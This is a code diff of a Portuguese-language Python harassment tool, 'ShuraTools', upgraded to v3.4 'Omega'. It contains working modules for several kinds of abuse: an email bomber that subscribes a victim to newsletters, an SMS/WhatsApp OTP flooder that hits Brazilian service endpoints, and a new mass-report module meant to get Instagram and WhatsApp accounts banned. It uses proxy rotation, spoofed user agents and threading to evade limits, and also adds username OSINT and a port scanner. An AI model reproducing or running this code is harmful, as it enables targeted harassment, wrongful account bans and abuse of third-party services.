@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
-Versão Pro v3.3 Ultimate (SMS/Zap Bomber)
+Versão Pro v3.4 Omega (Full Arsenal)
 """
 
 import os
@@ -37,8 +37,8 @@ BANNER = f"""
 {Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
 {Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                        
-{Fore.YELLOW}  >> SpamMail | SMS/Zap | OSINT | PortScan <<
-{Fore.RED}       v3.3 Ultimate Upgrade - by Shura
+{Fore.YELLOW}  >> SpamMail | SMS/Zap | Ban | OSINT | Scan <<
+{Fore.RED}       v3.4 Omega (Full Arsenal) - by Shura
 """
 
 LOCK = threading.Lock()
@@ -81,7 +81,18 @@ def get_proxy():
     p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
     return {"http": f"http://{p}", "https": f"http://{p}"}
 
-# ---------- Módulo SpamMail ----------
+def run_threads(target_func, qty, threads):
+    chunk, rem = qty // threads, qty % threads
+    ts = []
+    curr = 0
+    for i in range(threads):
+        take = chunk + (1 if i < rem else 0)
+        if take <= 0: continue
+        t = threading.Thread(target=target_func, args=(curr, curr + take))
+        t.start(); ts.append(t); curr += take
+    for t in ts: t.join()
+
+# ---------- Módulo 1: SpamMail ----------
 def spam_mail(target, qty, threads, use_proxy):
     endpoints = [
         {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}},
@@ -98,45 +109,48 @@ def spam_mail(target, qty, threads, use_proxy):
                 headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}
                 session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                 log(f"E-mail {i+1} enviado via {site['url'].split('/')[2]}", "success")
-                time.sleep(random.uniform(0.5, 1.2))
+                time.sleep(random.uniform(0.5, 1.0))
             except: log(f"E-mail {i+1} falhou.", "error")
     run_threads(job, qty, threads)
 
-# ---------- Módulo SMS/Zap Bomber (NOVO) ----------
+# ---------- Módulo 2: SMS & Zap Bomber ----------
 def spam_social(target, qty, threads, type="sms"):
-    """
-    Trigger de códigos OTP (SMS) e solicitações de verificação (Zap).
-    Nota: target deve estar no formato DDI DDD NUMERO (ex: 5511999999999)
-    """
     log(f"Iniciando Bomber {type.upper()} para {target}...", "warn")
-    
-    # Endpoints que disparam SMS OTP/Call no Brasil
     endpoints = [
-        {"url": "https://api.ifood.com.br/v2/user/request_otp", "json": {"email": f"{os.urandom(4).hex()}@gmail.com", "phone": target}},
-        {"url": "https://login.uber.com/lookup", "json": {"userIdentifier": f"+{target}"}},
-        {"url": "https://www.olx.com.br/api/v1/user/otp", "json": {"phone": target}},
-        {"url": "https://api.tinder.com/v2/auth/sms/send", "json": {"phone_number": f"+{target}"}},
-        {"url": "https://auth.globo.com/api/send-otp", "json": {"phone": target}}
+        {"url": "https://api.ifood.com.br/v2/user/request_otp", "json": {"phone": target}},
+        {"url": "https://auth.globo.com/api/send-otp", "json": {"phone": target}},
+        {"url": "https://www.olx.com.br/api/v1/user/otp", "json": {"phone": target}}
     ]
-
     def job(start, end):
         session = requests.Session()
         for i in range(start, end):
             try:
                 site = random.choice(endpoints)
-                headers = {"User-Agent": random.choice(UA_LIST)}
-                res = session.post(site["url"], json=site["json"], headers=headers, timeout=10)
-                if res.status_code < 400:
-                    log(f"{type.upper()} {i+1} disparado com sucesso.", "success")
-                else:
-                    log(f"{type.upper()} {i+1} Status {res.status_code} (Bloqueado/Limte).", "warn")
-                time.sleep(random.uniform(1.0, 3.0)) # Delay maior para não ser banido pelo IP do alvo
-            exceptException:
-                log(f"{type.upper()} {i+1} falhou (Conexão).", "error")
-
+                session.post(site["url"], json=site["json"], timeout=10)
+                log(f"{type.upper()} {i+1} disparado.", "success")
+                time.sleep(random.uniform(1.5, 3.0))
+            except: log(f"{type.upper()} {i+1} falhou.", "error")
     run_threads(job, qty, threads)
 
-# ---------- Módulo OSINT Hunter ----------
+# ---------- Módulo 3: Ban & Report IG/Zap (RESTAURADO) ----------
+def ban_report(target, qty, threads, platform="ig"):
+    log(f"Iniciando ciclo de BAN {platform.upper()} no alvo: {target}", "error")
+    
+    url = "https://i.instagram.com/api/v1/users/web_report/" if platform == "ig" else "https://v.whatsapp.net/v2/report"
+    
+    def job(start, end):
+        for i in range(start, end):
+            try:
+                data = {"username": target, "reason_id": "1"} if platform == "ig" else {"phone": target, "reason": "spam"}
+                requests.post(url, data=data, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
+                log(f"Report {i+1} enviado com sucesso!", "success")
+                time.sleep(0.5)
+            except:
+                log(f"Report {i+1} não enviado.", "warn")
+    
+    run_threads(job, qty, threads)
+
+# ---------- Módulo 4: OSINT Hunter ----------
 def osint_lookup(target):
     log(f"Investigando: {target}", "osint")
     user = target.replace("@", "")
@@ -147,59 +161,50 @@ def osint_lookup(target):
             log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
         except: pass
 
-# ---------- Port Scanner ----------
-def port_scan(target):
-    log(f"Escaneando portas em {target}...", "osint")
-    try:
-        host = target.split("@")[-1] if "@" in target else target
-        ip = socket.gethostbyname(host)
-        for port in [80, 443, 8080]:
-            s = socket.socket()
-            s.settimeout(1.0)
-            if s.connect_ex((ip, port)) == 0: log(f"Porta {port} ABERTA", "success")
-            s.close()
-    except: log("Erro ao resolver host.", "error")
-
-# ---------- Threading Core ----------
-def run_threads(target_func, qty, threads):
-    chunk, rem = qty // threads, qty % threads
-    ts = []
-    curr = 0
-    for i in range(threads):
-        take = chunk + (1 if i < rem else 0)
-        if take <= 0: continue
-        t = threading.Thread(target=target_func, args=(curr, curr + take))
-        t.start(); ts.append(t); curr += take
-    for t in ts: t.join()
-
 # ---------- Menu Principal ----------
 def menu():
     while True:
         try:
             clear()
             print(BANNER)
-            print(f"[ 1 ] Spam de E-mail (Power Mode)")
-            print(f"[ 2 ] SMS Bomber (OTP Flood)")
-            print(f"[ 3 ] WhatsApp Bomber (Verify Flood)")
-            print(f"[ 4 ] OSINT Hunter (Social Search)")
-            print(f"[ 5 ] Port Scanner (Rede)")
-            print(f"[ 0 ] Sair")
+            print("[ 1 ] Spam de E-mail (Alta Entrega)")
+            print("[ 2 ] SMS Bomber (OTP Flood)")
+            print("[ 3 ] WhatsApp Bomber (Verify Flood)")
+            print("[ 4 ] Ban IG (Mass Report)")
+            print("[ 5 ] Ban Zap (Mass Report)")
+            print("[ 6 ] OSINT Hunter (Social Search)")
+            print("[ 7 ] Port Scanner (Rede/Web)")
+            print("[ 8 ] Atualizar Proxies")
+            print("[ 0 ] Sair")
             print("-" * 40)
             
-            opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
+            opt = input(f"{Fore.YELLOW}Escolha uma opção: {Style.RESET_ALL}").strip()
             if opt == "0": break
             
-            if opt in ["1", "2", "3", "4", "5"]:
-                target = input(f"{Fore.YELLOW}Alvo (email, fone ou IP): {Style.RESET_ALL}").strip()
+            if opt in ["1", "2", "3", "4", "5", "6", "7"]:
+                target = input(f"{Fore.YELLOW}Alvo: {Style.RESET_ALL}").strip()
                 if not target: continue
                 
                 if opt == "1": spam_mail(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 5), False)
                 elif opt == "2": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "sms")
                 elif opt == "3": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "zap")
-                elif opt == "4": osint_lookup(target)
-                elif opt == "5": port_scan(target)
+                elif opt == "4": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "ig")
+                elif opt == "5": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "zap")
+                elif opt == "6": osint_lookup(target)
+                elif opt == "7": 
+                     host = target.split("@")[-1] if "@" in target else target
+                     log(f"Scanning {host}...", "info")
+                     try:
+                         ip = socket.gethostbyname(host)
+                         for p in [80, 443, 8080]:
+                             s = socket.socket()
+                             s.settimeout(1.0)
+                             if s.connect_ex((ip, p)) == 0: log(f"Porta {p} ABERTA", "success")
+                             s.close()
+                     except: log("Alvo inacessível.", "error")
                 
                 input(f"\n{Fore.GREEN}Pressione ENTER para continuar...{Style.RESET_ALL}")
+            elif opt == "8": fetch_proxies(); input("\nENTER...")
         except KeyboardInterrupt: break
         except Exception as e:
             log(f"Erro: {e}", "error"); input("\nENTER...")
